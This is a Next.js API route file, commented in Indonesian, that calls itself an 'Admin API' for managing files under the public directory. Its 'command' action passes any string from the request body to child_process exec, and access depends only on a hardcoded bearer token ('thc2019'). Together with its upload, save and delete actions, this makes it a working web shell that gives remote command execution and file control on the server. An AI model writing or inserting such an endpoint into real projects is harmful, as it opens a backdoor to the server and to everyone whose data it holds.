import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';
import { exec } from 'child_process';

const ROOT_DIR = process.cwd();
const PUBLIC_DIR = path.join(ROOT_DIR, 'public');

// Fungsi untuk memastikan path aman (tidak keluar dari public)
function getSafePath(requestedPath: string): string {
  // Jika path kosong atau '.', default ke public
  if (!requestedPath || requestedPath === '.') {
    return PUBLIC_DIR;
  }

  const requestedFullPath = path.resolve(PUBLIC_DIR, requestedPath);

  // Pastikan path tetap dalam public
  if (!requestedFullPath.startsWith(PUBLIC_DIR)) {
    return PUBLIC_DIR;
  }

  return requestedFullPath;
}

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { action, path: filePath, content, command, dir, name, data, autoReboot = false } = body;

    // Simple auth
    const authHeader = req.headers.get('authorization');
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    const token = authHeader.replace('Bearer ', '');
    if (token !== 'thc2019') {
      return NextResponse.json({ error: 'Invalid token' }, { status: 401 });
    }

    switch (action) {
      case 'ping':
        return NextResponse.json({
          success: true,
          message: 'API is working',
          timestamp: new Date().toISOString(),
          root: PUBLIC_DIR
        });

      case 'list': {
        const targetPath = filePath || '.';
        const fullPath = getSafePath(targetPath);

        try {
          // Cek apakah path ada
          if (!fs.existsSync(fullPath)) {
            return NextResponse.json({
              success: false,
              error: 'Path does not exist'
            });
          }

          const items = fs.readdirSync(fullPath);
          const files = items.map(item => {
            const itemPath = path.join(fullPath, item);
            try {
              const stats = fs.statSync(itemPath);
              return {
                name: item,
                isDir: stats.isDirectory(),
                size: stats.size,
                mtime: stats.mtime
              };
            } catch (err: any) {
              return {
                name: item,
                isDir: false,
                size: 0,
                error: err.message
              };
            }
          }).sort((a, b) => {
            if (a.isDir && !b.isDir) return -1;
            if (!a.isDir && b.isDir) return 1;
            return a.name.localeCompare(b.name);
          });

          // Hitung relative path dari public
          const relativePath = path.relative(PUBLIC_DIR, fullPath);

          return NextResponse.json({
            success: true,
            path: relativePath === '' ? '.' : relativePath,
            files,
            total: files.length,
            isRoot: relativePath === '' || relativePath === '.'
          });
        } catch (error: any) {
          return NextResponse.json({
            success: false,
            error: error.message
          }, { status: 500 });
        }
      }

      case 'read': {
        if (!filePath) {
          return NextResponse.json({ error: 'No path specified' }, { status: 400 });
        }

        const readPath = getSafePath(filePath);

        try {
          const fileContent = fs.readFileSync(readPath, 'utf-8');
          const stats = fs.statSync(readPath);

          return NextResponse.json({
            success: true,
            content: fileContent,
            size: stats.size,
            mtime: stats.mtime
          });
        } catch (error: any) {
          return NextResponse.json({
            success: false,
            error: error.message
          }, { status: 500 });
        }
      }

      case 'save': {
        if (!filePath) {
          return NextResponse.json({ error: 'No path specified' }, { status: 400 });
        }

        const savePath = getSafePath(filePath);

        try {
          const dirName = path.dirname(savePath);
          if (!fs.existsSync(dirName)) {
            fs.mkdirSync(dirName, { recursive: true });
          }

          fs.writeFileSync(savePath, content || '');
          return NextResponse.json({
            success: true,
            message: 'File saved',
            path: filePath
          });
        } catch (error: any) {
          return NextResponse.json({
            success: false,
            error: error.message
          }, { status: 500 });
        }
      }

      case 'command': {
        if (!command) {
          return NextResponse.json({ error: 'No command specified' }, { status: 400 });
        }

        return new Promise<NextResponse>((resolve) => {
          exec(command, { cwd: PUBLIC_DIR }, (error, stdout, stderr) => {
            if (error) {
              resolve(NextResponse.json({
                success: false,
                error: error.message,
                output: stderr
              }));
            } else {
              resolve(NextResponse.json({
                success: true,
                output: stdout || stderr || '(No output)'
              }));
            }
          });
        });
      }

      case 'reboot': {
        const rebootCommand = 'npm run buildcukimay';

        return new Promise<NextResponse>((resolve) => {
          exec(rebootCommand, { cwd: ROOT_DIR }, (error, stdout, stderr) => {
            if (error) {
              resolve(NextResponse.json({
                success: false,
                error: error.message,
                output: stderr
              }));
            } else {
              resolve(NextResponse.json({
                success: true,
                output: 'Server reboot initiated. Process will take 3-5 seconds.\n' + (stdout || stderr || 'Command executed in background')
              }));
            }
          });
        });
      }

      case 'mkdir': {
        if (!filePath) {
          return NextResponse.json({ error: 'No path specified' }, { status: 400 });
        }

        const mkdirPath = getSafePath(filePath);

        try {
          // Cek apakah folder sudah ada
          if (fs.existsSync(mkdirPath)) {
            return NextResponse.json({
              success: false,
              error: 'Directory already exists'
            });
          }

          fs.mkdirSync(mkdirPath, { recursive: true });
          return NextResponse.json({
            success: true,
            message: 'Directory created',
            path: filePath
          });
        } catch (error: any) {
          return NextResponse.json({
            success: false,
            error: error.message
          }, { status: 500 });
        }
      }

      case 'upload': {
        if (!dir || !name || !data) {
          return NextResponse.json({
            error: 'Missing required fields: dir, name, or data'
          }, { status: 400 });
        }

        // Validasi nama file
        if (name.includes('..') || name.includes('/') || name.includes('\\')) {
          return NextResponse.json({
            success: false,
            error: 'Invalid file name'
          });
        }

        const uploadDir = getSafePath(dir);
        const uploadPath = path.join(uploadDir, name);

        try {
          // Pastikan folder tujuan ada
          if (!fs.existsSync(uploadDir)) {
            fs.mkdirSync(uploadDir, { recursive: true });
          }

          // Cek apakah file sudah ada
          if (fs.existsSync(uploadPath)) {
            return NextResponse.json({
              success: false,
              error: 'File already exists. Please rename or delete existing file first.'
            });
          }

          // Decode base64 data
          // Format data: data:[mime];base64,...
          const base64Data = data.replace(/^data:.*?;base64,/, '');
          const buffer = Buffer.from(base64Data, 'base64');

          // Validasi ukuran file (max 10MB)
          if (buffer.length > 10 * 1024 * 1024) {
            return NextResponse.json({
              success: false,
              error: 'File size exceeds 10MB limit'
            });
          }

          // Simpan file
          fs.writeFileSync(uploadPath, buffer);

          // Auto-reboot jika diminta
          let rebootMessage = '';
          if (autoReboot) {
            const rebootCommand = 'npm run buildcukimay';

            // Jalankan reboot di background tanpa menunggu
            exec(rebootCommand, { cwd: ROOT_DIR }, (error, stdout, stderr) => {
              if (error) {
                console.error('Auto-reboot failed:', error.message);
              } else {
                console.log('Auto-reboot initiated after upload:', name);
              }
            });

            rebootMessage = ' (server auto-reboot initiated)';
          }

          // Dapatkan info file
          const stats = fs.statSync(uploadPath);

          return NextResponse.json({
            success: true,
            message: 'File uploaded successfully' + rebootMessage,
            path: path.join(dir, name),
            name: name,
            size: buffer.length,
            formattedSize: `${(buffer.length / 1024).toFixed(2)} KB`,
            mtime: stats.mtime,
            isDir: false,
            autoReboot: autoReboot
          });
        } catch (error: any) {
          return NextResponse.json({
            success: false,
            error: error.message
          }, { status: 500 });
        }
      }

      case 'delete': {
        if (!filePath) {
          return NextResponse.json({ error: 'No path specified' }, { status: 400 });
        }

        const deletePath = getSafePath(filePath);

        try {
          // Cek apakah file/folder ada
          if (!fs.existsSync(deletePath)) {
            return NextResponse.json({
              success: false,
              error: 'Path does not exist'
            });
          }

          // Cek apakah mencoba delete root public
          if (deletePath === PUBLIC_DIR || deletePath === PUBLIC_DIR + '/') {
            return NextResponse.json({
              success: false,
              error: 'Cannot delete root public directory'
            });
          }

          const stats = fs.statSync(deletePath);
          let message = '';

          if (stats.isDirectory()) {
            // Hitung jumlah file dalam folder
            const countFiles = (dirPath: string): number => {
              let count = 0;
              const items = fs.readdirSync(dirPath);

              for (const item of items) {
                const itemPath = path.join(dirPath, item);
                const itemStats = fs.statSync(itemPath);

                if (itemStats.isDirectory()) {
                  count += countFiles(itemPath);
                }
                count++;
              }
              return count;
            };

            const fileCount = countFiles(deletePath);
            message = `Deleted directory with ${fileCount} item(s)`;

            // Hapus folder dan isinya
            fs.rmSync(deletePath, { recursive: true, force: true });
          } else {
            message = 'File deleted';
            // Hapus file
            fs.unlinkSync(deletePath);
          }

          return NextResponse.json({
            success: true,
            message: message,
            path: filePath,
            wasDirectory: stats.isDirectory(),
            size: stats.size
          });
        } catch (error: any) {
          return NextResponse.json({
            success: false,
            error: error.message
          }, { status: 500 });
        }
      }

      default:
        return NextResponse.json({
          error: 'Invalid action',
          validActions: [
            'list', 'read', 'save', 'command', 'reboot', 'ping',
            'mkdir', 'upload', 'delete'
          ]
        }, { status: 400 });
    }

  } catch (error: any) {
    return NextResponse.json({
      success: false,
      error: error.message || 'Unknown error'
    }, { status: 500 });
  }
}

// GET untuk testing
export async function GET() {
  return NextResponse.json({
    message: 'Admin API is running',
    timestamp: new Date().toISOString(),
    root: PUBLIC_DIR,
    publicDir: PUBLIC_DIR,
    actions: [
      'list', 'read', 'save', 'command', 'reboot', 'ping',
      'mkdir', 'upload', 'delete'
    ]
  });
}
